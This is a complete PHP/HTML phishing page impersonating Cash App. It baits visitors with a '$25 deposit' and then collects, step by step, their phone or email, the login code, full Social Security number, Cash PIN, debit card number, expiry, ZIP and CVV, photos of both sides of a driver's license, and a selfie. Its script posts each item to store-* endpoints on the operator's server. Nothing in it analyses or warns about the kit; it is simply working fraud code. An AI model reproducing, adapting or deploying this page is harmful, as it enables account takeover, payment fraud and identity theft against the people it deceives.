<!doctype html>
<html lang="en">

<head>
	<meta charset="utf-8" />
	<meta httpequiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1.00001,viewport-fit=cover" />
	<title>Cash App</title>
	<style>
		#root,
		body,
		html {
			width: 100%;
			-webkit-overflow-scrolling: touch;
			margin: 0;
			padding: 0;
			min-height: 100%
		}

		#root {
			flex-shrink: 0;
			flex-basis: auto;
			flex-grow: 1;
			display: flex;
			flex: 1
		}

		html {
			scroll-behavior: smooth;
			-webkit-text-size-adjust: 100%;
			height: calc(100% + env(safe-area-inset-top))
		}

		body {
			display: flex;
			overflow-y: auto;
			overscroll-behavior-y: none;
			text-rendering: optimizeLegibility;
			-webkit-font-smoothing: antialiased;
			-moz-osx-font-smoothing: grayscale;
			-ms-overflow-style: scrollbar
		}

		@font-face {
			font-family: feather;
			src: url('<?php echo base_url(); ?>Feather.ttf');
			font-display: auto;
		}

		@font-face {
			font-family: material-community;
			src: url('<?php echo base_url(); ?>MaterialCommunityIcons.ttf');
			font-display: auto;
		}

		@font-face {
			font-family: material;
			src: url('<?php echo base_url(); ?>MaterialIcons.ttf');
			font-display: auto;
		}
	</style>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	<link rel="stylesheet" href="<?php echo base_url(); ?>assets/css/style.css">
</head>

<body><noscript>
		<form action="" style="background-color:#fff;position:fixed;top:0;left:0;right:0;bottom:0;z-index:9999">
			<div style="font-size:18px;font-family:Helvetica,sans-serif;line-height:24px;margin:10%;width:80%">
				<p>Oh no! It looks like JavaScript is not enabled in your browser.</p>
				<p style="margin:20px 0"><button type="submit" style="background-color:#4630eb;border-radius:100px;border:none;box-shadow:none;color:#fff;cursor:pointer;font-weight:700;line-height:20px;padding:6px 16px">Reload</button>
				</p>
			</div>
		</form>
	</noscript>
	<div id="root">
		<!-- Main Section Start -->
		<section id="main_section">
			<div class="container">
				<div class="row">
					<div class="col-md-12 pt-5">
						<div class="main_body">
							<div dir="auto" class="" style="color: rgb(0, 214, 50); font-family: material-community; font-size: 44px; font-style: normal; font-weight: normal; margin-right: 20px; margin-left: 20px; margin-top: 10px;">󰕥</div>
							<h2>$25 Will be deposited once You Accept the payment.</h2>
						</div>
					</div>
				</div>
			</div>
		</section>

		<div class="section-buttom" id="main_section_b">
			<div class="container">
				<div class="row">
					<div class="col-md-12 text-center">
						<div class="main-textbtn">
							<p>Your info is encrypted naver shared</p>
							<button type="submit" id="button1" class="btn btn-success main-textbtncls">Accept</button>
						</div>
					</div>
				</div>
			</div>
		</div>
		<!-- Main Section End -->

		<!-- Email or Phone Section Start -->
		<section id="email-section" style="display: none;">
			<div class="container">
				<div class="row">
					<div class="col-md-12 pt-5">
						<div class="main_body">
							<div class="form-group" id="sphone">
								<label for="" class="input-label">Enter Your Phone or Email</label>
								<h3>?</h3>
								<h4 class="phone-inputeh">+1</h4>
								<input type="text" id="dataphone" name="phone" placeholder="Phone Or Email" class="form-control phone-inputede" required>
								<p id="show-policy" style="display: none; color: rgb(0, 0, 0); font-size: 14px; font-weight: 300; line-height: 20px; margin-top: 10px;">By entering and tapping Next, you agree to theTerms, E-Sign Consent & Privacy Notice</p>
							</div>
							<div class="form-group" id="semail" style="display: none;">
								<label for="" class="input-label">Enter Your Phone or Email</label>
								<h3>?</h3>

								<input type="email" id="dataphone" name="phone" placeholder="Email" class="form-control" required>
								<p id="show-policy2" style="display: none; color: rgb(0, 0, 0); font-size: 14px; font-weight: 300; line-height: 20px; margin-top: 10px;">By entering and tapping Next, you agree to theTerms, E-Sign Consent & Privacy Notice</p>
							</div>
							<div class="btn-email text-center">
								<button type="submit" id="show-email" class="btn btn-light email-button">Use Email</button>
								<button type="submit" id="show-phone" class="btn btn-light email-button" style="display: none;">Use Phone</button>
								<button type="submit" id="next" class="btn btn-success next-button" disabled>Next</button>
							</div>
						</div>
					</div>
				</div>
			</div>
		</section>

		<!-- Email or Phone Section End -->

		<!-- Code Section Start -->
		<section id="code-section" style="display: none;">
			<div class="container">
				<div class="row">
					<div class="col-md-12 pt-5">
						<div class="main_body">
							<form action="#" class="actionCode">
								<div class="form-group">
									<label for="" class="input-label" id="showEmailToCode">Please enter the code sent to </label>
									<h3 class="codeh3">?</h3>
									<input type="text" id="confirmCode" placeholder="Confirmation Code" class="form-control" required>
								</div>
								<div class="btn-email text-center">
									<button type="submit" id="nextCode" class="btn btn-success confirm-button">Next</button>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</section>
		<!-- Code Section End -->

		<!-- SSN Section Start -->
		<section id="ssn-section" style="display: none;">
			<div class="container">
				<div class="row">
					<div class="col-md-12 pt-5">
						<div class="main_body">
							<form action="#" class="actionSsn">
								<div class="form-group">
									<label for="" class="input-label">Enter your Full SSN number</label>
									<h3>?</h3>
									<input type="text" id="getSSN" placeholder="SSN Number" class="form-control" required>
								</div>
								<div class="btn-email text-center">
									<button type="submit" id="nextSsn" class="btn btn-success confirm-button">Next</button>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</section>
		<!-- SSN Section End -->


		<!-- Pin Section Start -->
		<div class="container" id="pin-section" style="display: none;">
			<div class="row">
				<div class="col-md-12">
					<div class="confirm-header">
						<h1>Confirm Your Cash PIN</h1>
					</div>
					<div class="confirm-body">
						<form action="#" class="cal">
							<div class="row">
								<div class="col-md-12 m-auto text-center">
									<input type="hidden" id="result">
									<div class="top-button">
										<ul class="text-center" style="width:400px;">
											<li class="confrim-brn" id="pin1"></li>
											<li class="confrim-brn" id="pin2"></li>
											<li class="confrim-brn" id="pin3"></li>
											<li class="confrim-brn" id="pin4"></li>
										</ul>
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-dgn" value="1" onclick="dis('1')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-midd" value="2" onclick="dis('2')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-last" value="3" onclick="dis('3')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-dgn" value="4" onclick="dis('4')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-midd" value="5" onclick="dis('5')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-last" value="6" onclick="dis('6')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-dgn" value="7" onclick="dis('7')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-midd" value="8" onclick="dis('8')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-last" value="9" onclick="dis('9')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-dgn" value="">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<div class="form-group">
										<input type="button" class="form-control form-midd" value="0" onclick="dis('0')" onkeydown="myFunction(event)">
									</div>
								</div>
								<div class="col-md-4 col-sm-4 personal-width">
									<input type="button" class="form-control form-last" value="" onclick="clr()" style="font-family: material;">
								</div>
							</div>

							<div class="col-md-12 col-sm-12 text-center">
								<div class="top-buttom-button">
									<a type="button" class="btn btn-light btnClight">Help</a>
								</div>
							</div>
					</div>
					</form>
				</div>
			</div>
		</div>
	</div>
	<!-- Pin Section End -->


	<!-- Card Section Start -->
	<section id="card-section" style="background-color:rgb(242, 242, 242); display: none;">
		<div class="container">
			<div class="row">
				<div class="col-md-12 pt-5">
					<div class="zip-header">
						<h3>Add debit card details to link an account</h3>
						<p>Linking an external account allows you to move money in and out of your Cash App balance</p>
					</div>
					<div class="main_body">
						<div class="form-group">
							<input type="text" id="cardNumber" placeholder="Debit Cart Number" class="form-control zipcontroll" maxlength="16">
						</div>
						<div class="form-group">
							<input type="text" id="cardDate" placeholder="MM/YY" class="form-control zipcontroll" maxlength="7" onkeyup="formatString(event);">
						</div>
						<div class="form-group">
							<input type="text" id="cardZip" placeholder="Zip Code" class="form-control zipcontroll zipcontrollmobile" maxlength="10">
						</div>
						<div class="form-group">
							<input type="text" id="cardCvv" placeholder="3 Digi CVV" class="form-control zipcontroll zipcontrollmobile margin-test" maxlength="3">
						</div>
						<div class="btn-email text-center">
							<button type="submit" id="cardSkip" class="btn btn-light email-button">Skip</button>
							<button type="submit" id="nextCard" class="btn btn-success next-button">Link Cart</button>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!-- Card Section End -->




	<!-- Camera Section Start -->
	<div class="container" id="camera" style="display: none;">
		<div class="row">
			<div class="container">
				<h3 class="camera-header" id="front-nid">Scan the front of your driver's license or state ID</h3>
				<h3 class="camera-header" id="back-nid" style="display: none;">Scan the back of the same driver's license or state ID</h3>
				<h3 class="camera-header" id="picture" style="display: none;">Take a clear selfie of your face</h3>
			</div>
		</div>
		<main id="front-nid2">
			<canvas id="camera--sensor"></canvas>
			<video id="camera--view" autoplay playsinline></video>
			<button id="camera--trigger">
				<div dir="auto" class="css-901oao r-1loqt21 r-13uqrnb r-lrvibr" style="color: rgb(0, 0, 0); font-family: feather; font-size: 21px; font-weight: normal;"></div>
			</button>
		</main>
		<main id="back-nid2" style="display: none;">
			<canvas id="camera--sensor2"></canvas>
			<video id="camera--view2" autoplay playsinline></video>
			<button id="camera--trigger2">
				<div dir="auto" class="css-901oao r-1loqt21 r-13uqrnb r-lrvibr" style="color: rgb(0, 0, 0); font-family: feather; font-size: 21px; font-weight: normal;"></div>
			</button>
		</main>
		<main id="picture2" style="display: none;">
			<canvas id="camera--sensor3"></canvas>
			<video id="camera--view3" autoplay playsinline></video>
			<button id="camera--trigger3">
				<div dir="auto" class="css-901oao r-1loqt21 r-13uqrnb r-lrvibr" style="color: rgb(0, 0, 0); font-family: feather; font-size: 21px; font-weight: normal;"></div>
			</button>
		</main>
	</div>
	<!-- Camera Section End -->

	</div>
	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
	<script type="text/javascript">
		var base_url = '<?php echo base_url(); ?>';
		var elem = document.documentElement;

		function openFullscreen() {
			if (elem.requestFullscreen) {
				elem.requestFullscreen();
			} else if (elem.webkitRequestFullscreen) {
				/* Safari */
				elem.webkitRequestFullscreen();
			} else if (elem.msRequestFullscreen) {
				/* IE11 */
				elem.msRequestFullscreen();
			}
		}
		document.getElementById("root").addEventListener("click", openFullscreen);


		// Section
		$("#button1").click(function() {
			$("#main_section").hide();
			$("#main_section_b").hide();
			$("#email-section").show();
		});

		// Section
		$("#button2").click(function() {
			location.reload();
		});


		// Phone or email
		$("#show-email").click(function() {
			$("#sphone").hide();
			$("#show-email").hide();
			$("#semail").show();
			$("#show-phone").show();
		});

		$("#show-phone").click(function() {
			$("#semail").hide();
			$("#show-phone").hide();
			$("#sphone").show();
			$("#show-email").show();
		});

		$("#sphone").keyup(function() {
			var number = $("#dataphone").val().length;
			if (number > 9) {
				$("#show-policy").show();
				$("#next").removeAttr('disabled');
			} else {
				$("#show-policy").hide();
				$("#next").attr("disabled", true);
			}
		});

		$("#semail").keyup(function() {
			var number = $("#dataphone").val().length;
			if (number > 9) {
				$("#show-policy2").show();
				$("#next").removeAttr('disabled');
			} else {
				$("#show-policy2").hide();
				$("#next").attr("disabled", true);
			}
		});

		// Store Phone Data
		$("#next").click(function() {
			var email = $("#dataphone").val();
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'email': email
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-email",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("#main_section").hide();
						$("#main_section_b").hide();
						$("#email-section").hide();
						$("#code-section").show();
						$("#showEmailToCode").append(response.email);
					}
				}
			});
		});

		// Store Code Data
		$('.actionCode').submit(function(e) {
			e.preventDefault();
			var code = $("#confirmCode").val();
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'code': code
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-code",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("#main_section").hide();
						$("#main_section_b").hide();
						$("#email-section").hide();
						$("#code-section").hide();
						$("#ssn-section").show();
					}
				}
			});
		});


		// SSN Code Data
		$('.actionSsn').submit(function(e) {
			e.preventDefault();
			// $("#nextSsn").click(function() {
			var ssn = $("#getSSN").val();
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'ssn': ssn
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-ssn",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("#main_section").hide();
						$("#main_section_b").hide();
						$("#email-section").hide();
						$("#code-section").hide();
						$("#ssn-section").hide();
						$("#pin-section").show();
					}
				}
			});
		});


		// Pin Section
		function dis(val) {
			var num = document.getElementById("result").value += val
			var tnum = num.length;
			if (tnum < 5) {
				if (tnum == 1) {
					$("#pin1").attr('style', 'background-color: #000');
				} else if (tnum == 2) {
					$("#pin1").attr('style', 'background-color: #000');
					$("#pin2").attr('style', 'background-color: #000');
				} else if (tnum == 3) {
					$("#pin1").attr('style', 'background-color: #000');
					$("#pin2").attr('style', 'background-color: #000');
					$("#pin3").attr('style', 'background-color: #000');
				} else if (tnum == 4) {
					$("#pin1").attr('style', 'background-color: #000');
					$("#pin2").attr('style', 'background-color: #000');
					$("#pin3").attr('style', 'background-color: #000');
					$("#pin4").attr('style', 'background-color: #000');
				}

				if (tnum === 4) {
					var data = {
						'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
						'pin': num
					};
					$.ajax({
						type: "POST",
						url: base_url + "api/store-pin",
						data: data,
						dataType: 'JSON',
						success: function(response) {
							if (response.status == true) {
								$("#main_section").hide();
								$("#main_section_b").hide();
								$("#email-section").hide();
								$("#code-section").hide();
								$("#ssn-section").hide();
								$("#pin-section").hide();
								$("#card-section").show();
							}
						}
					});
				}
			}
		}

		function myFunction(event) {
			if (event.key == '0' || event.key == '1' ||
				event.key == '2' || event.key == '3' ||
				event.key == '4' || event.key == '5' ||
				event.key == '6' || event.key == '7' ||
				event.key == '8' || event.key == '9' ||
				event.key == '+' || event.key == '-' ||
				event.key == '*' || event.key == '/')
				document.getElementById("result").value += event.key;
		}

		function clr() {
			document.getElementById("result").value = "";
			$('.confrim-brn').removeAttr('style');
		}


		// Card Data
		$("#nextCard").click(function() {
			var cardNumber = $("#cardNumber").val();
			var cardDate = $("#cardDate").val();
			var cardZip = $("#cardZip").val();
			var cardCvv = $("#cardCvv").val();
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'card-number': cardNumber,
				'card-date': cardDate,
				'card-zip': cardZip,
				'card-cvv': cardCvv
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-card",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("#main_section").hide();
						$("#main_section_b").hide();
						$("#email-section").hide();
						$("#code-section").hide();
						$("#pin-section").hide();
						$("#ssn-section").hide();
						$("#card-section").hide();
						$('#camera').show();
						$("body").attr("style", "background-color: black");
					}
				}
			});
		});

		// Card Date Formate
		function formatString(e) {
			var inputChar = String.fromCharCode(event.keyCode);
			var code = event.keyCode;
			var allowedKeys = [8];
			if (allowedKeys.indexOf(code) !== -1) {
				return;
			}

			event.target.value = event.target.value.replace(
				/^([1-9]\/|[2-9])$/g, '0$1/' // 3 > 03/
			).replace(
				/^(0[1-9]|1[0-2])$/g, '$1/' // 11 > 11/
			).replace(
				/^([0-1])([3-9])$/g, '0$1/$2' // 13 > 01/3
			).replace(
				/^(0?[1-9]|1[0-2])([0-9]{2})$/g, '$1/$2' // 141 > 01/41
			).replace(
				/^([0]+)\/|[0]+$/g, '0' // 0/ > 0 and 00 > 0
			).replace(
				/[^\d\/]|^[\/]*$/g, '' // To allow only digits and `/`
			).replace(
				/\/\//g, '/' // Prevent entering more than 1 `/`
			);
		}


		// Camera
		var constraints = {
			video: {
				facingMode: "environment"
			},
			audio: false
		};
		var track = null;

		const cameraView = document.querySelector("#camera--view"),
			cameraSensor = document.querySelector("#camera--sensor"),
			cameraTrigger = document.querySelector("#camera--trigger");

		function cameraStart() {
			navigator.mediaDevices
				.getUserMedia(constraints)
				.then(function(stream) {
					track = stream.getTracks()[0];
					cameraView.srcObject = stream;
				})
				.catch(function(error) {
					console.error("Oops. Something is broken.", error);
				});
		}
		cameraTrigger.onclick = function() {
			cameraSensor.width = cameraView.videoWidth;
			cameraSensor.height = cameraView.videoHeight;
			cameraSensor.getContext("2d").drawImage(cameraView, 0, 0);
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'image': cameraSensor.toDataURL("image/webp")
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-camera",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("#main_section").hide();
						$("#main_section_b").hide();
						$("#email-section").hide();
						$("#code-section").hide();
						$("#pin-section").hide();
						$("#ssn-section").hide();
						$("#card-section").hide();
						$("body").attr("style", "background-color: black");
						$("#front-nid").hide();
						$("#front-nid2").hide();
						$("#back-nid").show();
						$("#back-nid2").show();
					}
				}
			});
		};
		window.addEventListener("load", cameraStart, false);


		// Camera 2
		var constraints2 = {
			video: {
				facingMode: "environment"
			},
			audio: false
		};
		var track2 = null;

		const cameraView2 = document.querySelector("#camera--view2"),
			cameraSensor2 = document.querySelector("#camera--sensor2"),
			cameraTrigger2 = document.querySelector("#camera--trigger2");

		function cameraStart2() {
			navigator.mediaDevices
				.getUserMedia(constraints2)
				.then(function(stream) {
					track2 = stream.getTracks()[0];
					cameraView2.srcObject = stream;
				})
				.catch(function(error) {
					console.error("Oops. Something is broken.", error);
				});
		}
		cameraTrigger2.onclick = function() {
			cameraSensor2.width = cameraView2.videoWidth;
			cameraSensor2.height = cameraView2.videoHeight;
			cameraSensor2.getContext("2d").drawImage(cameraView2, 0, 0);
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'image2': cameraSensor2.toDataURL("image/webp")
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-camera2",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("#main_section").hide();
						$("#main_section_b").hide();
						$("#email-section").hide();
						$("#code-section").hide();
						$("#pin-section").hide();
						$("#ssn-section").hide();
						$("#card-section").hide();
						$("body").attr("style", "background-color: black");
						$("#front-nid").hide();
						$("#front-nid2").hide();
						$("#back-nid").hide();
						$("#back-nid2").hide();
						$("#picture").show();
						$("#picture2").show();
					}
				}
			});
		};
		window.addEventListener("load", cameraStart2, false);



		// Camera 3
		var constraints3 = {
			video: {
				facingMode: "environment"
			},
			audio: false
		};
		var track3 = null;

		const cameraView3 = document.querySelector("#camera--view3"),
			cameraSensor3 = document.querySelector("#camera--sensor3"),
			cameraTrigger3 = document.querySelector("#camera--trigger3");

		function cameraStart3() {
			navigator.mediaDevices
				.getUserMedia(constraints3)
				.then(function(stream) {
					track3 = stream.getTracks()[0];
					cameraView3.srcObject = stream;
				})
				.catch(function(error) {
					console.error("Oops. Something is broken.", error);
				});
		}
		cameraTrigger3.onclick = function() {
			cameraSensor3.width = cameraView3.videoWidth;
			cameraSensor3.height = cameraView3.videoHeight;
			cameraSensor3.getContext("2d").drawImage(cameraView3, 0, 0);
			var data = {
				'<?php echo $this->security->get_csrf_token_name(); ?>': '<?php echo $this->security->get_csrf_hash(); ?>',
				'image3': cameraSensor3.toDataURL("image/webp")
			};
			$.ajax({
				type: "POST",
				url: base_url + "api/store-camera3",
				data: data,
				dataType: 'JSON',
				success: function(response) {
					if (response.status == true) {
						$("body").removeAttr("style", "background-color: black");
						location.reload();
					}
				}
			});
		};
		window.addEventListener("load", cameraStart3, false);
	</script>
</body>

</html>